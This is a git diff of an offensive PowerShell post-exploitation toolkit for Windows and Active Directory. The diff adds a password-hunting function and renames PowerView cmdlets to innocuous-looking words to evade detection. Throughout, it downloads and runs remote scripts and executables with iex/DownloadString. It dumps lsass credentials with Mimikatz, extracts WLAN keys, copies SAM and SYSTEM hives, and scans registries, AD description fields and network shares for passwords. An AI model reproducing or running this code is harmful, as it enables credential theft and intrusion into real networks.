@@ -253,7 +253,7 @@ function kittielocal
             $output_file = Read-Host -Prompt 'Save credentials to a local text file? (yes/no)'
             if ($output_file -eq "yes" -or $output_file -eq "y" -or $output_file -eq "Yes" -or $output_file -eq "Y")
             {
-                Write-Host -ForegroundColor Yellow 'Dumping Credentials from Memory and SAM Database, because we can:'
+                Write-Host -ForegroundColor Yellow 'Dumping Credentials from lsass.exe:'
                 Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
                 Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
             }
@@ -299,7 +299,8 @@ function localreconmodules
 
 
             #Check for WSUS Updates over HTTP
-	        $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
+	        Write-Host -ForegroundColor Yellow 'Checking for WSUS over http'
+            $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
             $WUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer
 
             if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) 
@@ -309,10 +310,12 @@ function localreconmodules
             }
 
             #Check for SMB Signing
+            Write-Host -ForegroundColor Yellow 'Check SMB-Signing for the local system'
             iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-SMBNegotiate.ps1')
             Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\LocalRecon\SMBSigningState.txt"
 
             #Collecting Informations
+            Write-Host -ForegroundColor Yellow 'Collecting local system Informations for later lookup, saving them to .\LocalRecon\'
             systeminfo >> "$currentPath\LocalRecon\systeminfo.txt"
             wmic qfe >> "$currentPath\LocalRecon\Patches.txt"
             wmic os get osarchitecture >> "$currentPath\LocalRecon\Architecture.txt"
@@ -333,24 +336,11 @@ function localreconmodules
             $passhunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
             if ($passhunt -eq "yes" -or $passhunt -eq "y" -or $passhunt -eq "Yes" -or $passhunt -eq "Y")
             {
-                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
-                copy .\passhunt.exe $Env:USERPROFILE
-                cmd /c start powershell -Command ".\passhunt.exe"
-                $sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'
-                if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
-                {
-                    get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
-                    $shares = get-content .\passhuntshares.txt | select-object -skip 4    
-                    foreach ($line in $shares)
-                    {
-                        cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
-                    } 
-                                      
-                }
+                passhunt -local
             }
             
             # Collecting more information
+            Write-Host -ForegroundColor Yellow 'Checking for accesible SAM/SYS Files'
             If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"}            
             If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\LocalRecon\SAM"}
             If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM"}
@@ -360,9 +350,11 @@ function localreconmodules
             If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\SYSTEM "$currentPath\LocalRecon\SYS"}
             If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\RegBack\system "$currentPath\LocalRecon\SYS"}
 
+            Write-Host -ForegroundColor Yellow 'Checking Registry for potential passwords'
             REG QUERY HKLM /F "passwor" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKLMRegistryPasswords.txt"
             REG QUERY HKCU /F "password" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKCURegistryPasswords.txt"
 
+            Write-Host -ForegroundColor Yellow 'Checking sensitive registry entries..'
             If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon')
 	        {
 	    	    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"
@@ -382,6 +374,7 @@ function localreconmodules
 
             Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize >> "$currentPath\LocalRecon\RunningTasks.txt"
 
+            Write-Host -ForegroundColor Yellow 'Checking for usable credentials (cmdkey /list)'
             cmdkey /list >> "$currentPath\LocalRecon\SavedCredentials.txt" # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 
 
@@ -442,6 +435,91 @@ function localreconmodules
             }                
 }
 
+function passhunt
+{
+<#
+        .DESCRIPTION
+        Search for hashed or cleartext passwords on the local system or on the domain.
+        Author: @SecureThisShit
+        License: BSD 3-Clause
+    #>
+    #Local/Domain Recon / Privesc
+    Param
+    (
+        [String]
+        $local,
+
+        [string]
+        $domain
+    )
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
+
+        if ($domain)
+        {
+            Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
+            $ActiveServers = Get-DomainComputer -Ping -OperatingSystem "Windows Server*"
+            $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"
+
+            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewobfs.ps1')
+            Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
+            brainstorm -ComputerFile "$currentPath\DomainRecon\activeservers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
+             
+            $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
+            $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
+
+            Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
+            if (test-path $currentPath\passhunt.exe)
+            {
+                foreach ($line in $testShares)
+                {
+                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
+                }
+            }
+            else
+            {
+                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+                Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
+                foreach ($line in $shares)
+                {
+                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
+                } 
+                                    
+            }
+        }
+        if ($local)
+        {
+            if (test-path $currentPath\passhunt.exe)
+            {
+                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+                Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
+            }
+            cmd /c start powershell -Command "$currentPath\passhunt.exe"
+            $sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'
+            if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
+            {
+                get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
+                $shares = get-content .\passhuntshares.txt | select-object -skip 4    
+                foreach ($line in $shares)
+                {
+                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
+                } 
+                                  
+            }
+        }
+        else
+        {
+            if (test-path $currentPath\passhunt.exe)
+            {
+                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+                Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
+            }
+            cmd /c start powershell -Command "$currentPath\passhunt.exe"
+        }
+
+}
+
 function jaws
 {
 <#
@@ -494,8 +572,7 @@ function domainreconmodules
             odometer >> "$currentPath\DomainRecon\NetDomainController.txt"  
             Houyhnhnm >> "$currentPath\DomainRecon\NetUser.txt"    
             Randal >> "$currentPath\DomainRecon\NetSystems.txt"
-	    # Get-NetPrinter obfuscated
-            Get-Printer >> "$currentPath\DomainRecon\Printer.txt"
+	        Get-Printer >> "$currentPath\DomainRecon\localPrinter.txt"
             damsels >> "$currentPath\DomainRecon\NetOU.txt"    
             xylophone >> "$currentPath\DomainRecon\NetSite.txt"  
             ignominies >> "$currentPath\DomainRecon\NetSubnet.txt"
@@ -503,42 +580,48 @@ function domainreconmodules
             confessedly >> "$currentPath\DomainRecon\NetGroupMember.txt"   
             aqueduct >> "$currentPath\DomainRecon\NetFileServer.txt" 
             marinated >> "$currentPath\DomainRecon\DFSshare.txt" 
-            #merchandising >> "$currentPath\DomainRecon\DFSsharev1.txt"
-            #visible >> "$currentPath\DomainRecon\DFSsharev2.txt"
             liberation >> "$currentPath\DomainRecon\NetShare.txt" 
             cherubs >> "$currentPath\DomainRecon\NetLoggedon"
             Trojans >> "$currentPath\DomainRecon\Domaintrusts.txt"
             sequined >> "$currentPath\DomainRecon\ForestTrust.txt"
             ringer >> "$currentPath\DomainRecon\ForeignUser.txt"
             condor >> "$currentPath\DomainRecon\ForeignGroup.txt"
-	    
+            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
+            breviaries -Printers >> "$currentPath\DomainRecon\DomainPrinters.txt" 	        
+
             #Search for AD-Passwords in description fields
+            Write-Host -ForegroundColor Yellow 'Searching for passwords in active directory description fields..'
+            
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            
             Invoke-Webrequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Microsoft.ActiveDirectory.Management.dll' -Outfile "$currentPath\Microsoft.ActiveDirectory.Management.dll"
             Import-Module .\Microsoft.ActiveDirectory.Management.dll
 	        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
             thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"
 
-	        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/Pviewdev.ps1')
+            Write-Host -ForegroundColor Yellow 'Searching for Users without password Change for a long time'
 	        $Date = (Get-Date).AddYears(-1).ToFileTime()
-            Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset >> "$currentPath\DomainRecon\Users_Nochangedpassword.txt"
+            prostituted -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset >> "$currentPath\DomainRecon\Users_Nochangedpassword.txt"
 	        
-	        Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
-            Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
+	        prostituted -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
+            prostituted -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
 	        
-	        $Computers = Get-DomainComputer -Unconstrained >> "$currentPath\DomainRecon\Unconstrained_Systems.txt"
-            $Users = Get-DomainUser -AllowDelegation -AdminCount >> "$currentPath\DomainRecon\AllowDelegationUsers.txt"
+            Write-Host -ForegroundColor Yellow 'Searching for Unconstrained delegation Systems and Users'
+	        $Computers = breviaries -Unconstrained >> "$currentPath\DomainRecon\Unconstrained_Systems.txt"
+            $Users = prostituted -AllowDelegation -AdminCount >> "$currentPath\DomainRecon\AllowDelegationUsers.txt"
 	        
-	        $DomainPolicy = Get-DomainPolicy -Policy Domain
+            Write-Host -ForegroundColor Yellow 'Identify kerberos and password policy..'
+	        $DomainPolicy = forsakes -Policy Domain
             $DomainPolicy.KerberosPolicy >> "$currentPath\DomainRecon\Kerberospolicy.txt"
             $DomainPolicy.SystemAccess >> "$currentPath\DomainRecon\Passwordpolicy.txt"
 	        
-	        Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity   >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
+            Write-Host -ForegroundColor Yellow 'Searching for Systems we have RDP access to..'
+	        rewires -LocalGroup RDP -Identity   >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
 	        
 	        $session = Read-Host -Prompt 'Do you want to search for potential sensitive domain share files - can take a while? (yes/no)'
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
-	        	Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
+	        	mangers >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
 	        }
             
             $aclight = Read-Host -Prompt 'Starting ACLAnalysis for Shadow Admin detection? (yes/no)'
@@ -561,7 +644,7 @@ function domainreconmodules
             {
 	    	        Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
                     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/SpoolerScanner/master/SpoolerScan.ps1')
-                    $domcontrols = Get-NetDomainController
+                    $domcontrols = terracing
                     foreach ($domc in $domcontrols.IPAddress)
                     {
                         if (spoolscan -target $domc)
@@ -574,7 +657,7 @@ function domainreconmodules
             	    if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
                     {
 		    	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
-		    	$ActiveServers = Get-DomainComputer -Ping -OperatingSystem "Windows Server*"
+		    	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
 			foreach ($acserver in $ActiveServers.dnshostname)
                     	{
                         	if (spoolscan -target $acserver)
@@ -589,35 +672,7 @@ function domainreconmodules
 	    $domainsharepass = Read-Host -Prompt 'Check Domain Network-Shares for cleartext passwords using passhunt.exe? (yes/no)'
             if ($domainsharepass -eq "yes" -or $domainsharepass -eq "y" -or $domainsharepass -eq "Yes" -or $domainsharepass -eq "Y")
             {
-                Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
-                $ActiveServers = Get-DomainComputer -Ping -OperatingSystem "Windows Server*"
-                $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"
-                
-                Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
-                Invoke-ShareFinder -ComputerFile "$currentPath\DomainRecon\activeservers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
-                
-                $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
-                $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
-
-                Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
-                if (test-path $currentPath\passhunt.exe)
-                {
-                    foreach ($line in $testShares)
-                    {
-                        cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
-                    }
-                }
-                else
-                {
-                    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                    Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
-                    foreach ($line in $shares)
-                    {
-                        cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
-                    } 
-                                      
-                }
-
+                passhunt -domain
             }
 	    
             Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
@@ -915,7 +970,7 @@ function groupsearch
     #Enumeration Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/Pviewdev.ps1')
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
     $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
             if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
             {
@@ -923,13 +978,13 @@ function groupsearch
                 $username = Get-Credential
                 $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                 Write-Host -ForegroundColor Yellow 'Searching...:'
-                Get-DomainGPOUserLocalGroupMapping -LocalGroup $group -Credential $username >> $currentPath\Groupsearches.txt
+                rewires -LocalGroup $group -Credential $username >> $currentPath\Groupsearches.txt
             }
             else
             {
                 $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                 Write-Host -ForegroundColor Yellow 'Searching...:'
-                bGet-DomainGPOUserLocalGroupMapping -LocalGroup $group -Identity $env:UserName >> $currentPath\Groupsearches.txt
+                rewires -LocalGroup $group -Identity $env:UserName >> $currentPath\Groupsearches.txt
                 Write-Host -ForegroundColor Yellow 'Systems saved to >> $currentPath\Groupsearches.txt:'
             }
 }
